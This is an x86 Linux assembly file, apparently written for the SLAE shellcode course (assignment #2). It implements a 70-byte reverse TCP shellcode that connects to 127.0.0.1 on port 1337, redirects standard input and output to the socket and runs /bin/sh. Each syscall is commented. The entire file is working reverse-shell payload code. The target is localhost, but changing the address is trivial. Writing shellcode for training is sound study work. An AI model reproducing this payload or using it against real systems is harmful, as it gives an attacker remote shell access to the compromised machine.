; Author :      Demey Alexandre (PA-14186)
; Date :        01-05-2020
; 
; Description : SLAE assignment #2 - Shell reverse tcp
;               Connect to IP 127.0.0.1, port 1337 and spawn a shell
;
; Shellcode length : 70 bytes

global _start

section .text

_start:

;socket(AF_INET, SOCK_STREAM, 0)
;socketcall(SYS_SOCKET, *socket_args)
    xor ebx, ebx        ; set ebx to 0
    mul ebx             ; set eax and edx to 0

    push ebx            ; 0 for the protocol argument
    inc ebx
    push ebx            ; SOCK_STREAM
    push byte 0x2       ; AF_INET

    mov ecx, esp        ; ecx points to the socket's arguments
    add al, 0x66        ; socketcall 
    int 0x80
    
    xchg edi, eax       ; we save the sockfd returned by socket to edi 
                        ; (xchg is one byte opcode, so best than mov(2 bytes) 
                        ; because we dont care about eax value)

;connect(sockfd, *sockaddr, addrlen)
;socketcall(3, *args)
;return 0 if success
    pop ebx             ; ebx set to SYS_BIND 
                        ; 2 was the last value pushed on the stack
      
    push  0x0100007f    ; ip   127.0.0.1
    push  word 0x3905   ; port 1337
    push  bx            ; AF_INET
    mov ecx, esp        ; ecx point to the sockaddr struct

    push   0x10         ; sockaddr struct length
    push   ecx          ; address to the sockaddr struct
    push   edi          ; sockfd previously saved

    mov    ecx,esp      ; ecx points to the connect's arguments

    inc ebx             ; 3 for SYS_CONNECT

    push 0x66           ; socketcall
    pop eax
    int 0x80

;dup2(sockfd, stderr)
;dup2(sockfd, stdout)
;dup2(sockfd, stdin])
    xchg ecx, ebx       ; ecx set to 3
    xchg ebx, edi       ; set ebx to sockfd 
link:
    dec    ecx          ; set ecx from 2 to 0 (stderr to stdin)
    mov    al,0x3f      ; dup2 syscall value
    int    0x80
    jne    link         ; if ecx not equal to stdin, overwrite next standard i/o

;execve("/bin//sh", NULL, NULL) 

    push   eax          ; string terminator 0x00
    push   0x68732f2f   ; push /bin//sh in reverse order
    push   0x6e69622f
    mov    ebx,esp      ; ebx point to /bin//sh
                        ; ecx and edx already set to 0x00 (Null pointer)
    mov    al,0xb       ; execve syscall number
    int    0x80
